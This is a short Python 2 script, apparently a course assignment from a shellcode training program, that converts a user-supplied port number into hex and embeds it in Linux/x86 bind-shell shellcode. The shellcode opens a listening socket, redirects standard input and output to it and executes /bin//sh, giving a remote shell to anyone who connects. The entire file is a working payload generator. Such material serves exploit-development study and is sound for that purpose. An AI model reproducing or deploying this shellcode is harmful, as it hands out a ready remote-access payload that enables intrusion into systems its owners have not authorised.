#!/usr/bin/python
 
# SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86) Wrapper
# Author:  Julien Ahrens (@MrTuxracer)
# Website:  http://www.rcesecurity.com 

import sys

total = len(sys.argv)
if total != 2:
	print "Fail!"
else:
	try:
		port = int(sys.argv[1])
		if port > 65535:
			print "Port is greater than 65535!"
			exit()
		if port < 1024:
			print "Port is smaller than 1024! Remember u need r00t for this ;)"
			exit()			
		hp = hex(port)[2:]
		if len(hp) < 4:
			hp = "0" + hp

		print "Hex value of port: " + hp

		b1 = hp[0:2]
		b2 = hp[2:4] 

		if b1 == "00" or b2 == "00":
			print "Port contains \\x00!"
			exit()

		if len(b1) < 2:
			b1="\\x0" + b1
		if len(b1) == 2:
			b1="\\x" + b1
		if len(b2) < 2:
			b2="\\x0" + b2
		if len(b2) == 2:
			b2="\\x" + b2

		shellport=b1+b2

		print "Shellcode-ready port: " + shellport

		shellcode = ("\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6"+
		"\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80"+
		"\\x5f\\x97\\x93\\xb0\\x66\\x56\\x66\\x68"+
		shellport+"\\x66\\x53\\x89\\xe1\\x6a\\x10"+
		"\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66"+
		"\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80"+
		"\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1"+
		"\\xcd\\x80\\x59\\x59\\xb1\\x02\\x93\\xb0"+
		"\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b"+
		"\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"+
		"\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd"+
		"\\x80")

		print "Final shellcode:\r\b\"" + shellcode + "\""

	except:
		print "exiting..."
